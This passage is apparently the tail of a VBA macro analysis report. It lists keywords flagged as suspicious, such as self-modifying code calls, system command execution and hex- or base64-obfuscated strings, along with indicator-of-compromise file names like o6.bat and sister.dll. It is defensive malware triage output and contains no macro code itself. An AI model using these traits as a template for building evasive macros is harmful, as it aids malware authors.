|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Debug.exe           |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |Excel.exe           |Executable file name                         |
|IOC       |o6.reg              |Executable file name                         |
|IOC       |O6.REG              |Executable file name                         |
|IOC       |o6.bat              |Executable file name                         |
|IOC       |O6.BAT              |Executable file name                         |
|IOC       |sister.dll          |Executable file name                         |
|IOC       |winword.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

